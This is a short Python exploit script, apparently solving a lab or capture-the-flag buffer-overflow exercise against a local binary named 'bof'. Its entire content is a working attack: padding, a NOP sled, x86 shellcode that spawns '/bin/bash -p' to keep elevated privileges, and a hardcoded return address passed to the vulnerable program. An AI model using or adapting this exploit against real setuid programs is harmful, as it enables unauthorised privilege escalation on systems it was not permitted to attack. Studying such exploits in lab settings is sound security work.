#!/usr/bin/env python3

import subprocess

file = "./bof"
offset = 136

# Shellcode -> /bin/bash -p
buf =  b""
buf += b"\x90" * 16
buf += b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"

# Direction
jmp = b"\xd0\xd2\xff\xff"

# Padding
offset = offset - len(buf)
padding = b"A" * offset

# Payload
payload = padding + buf + jmp

p = subprocess.run([file, payload])
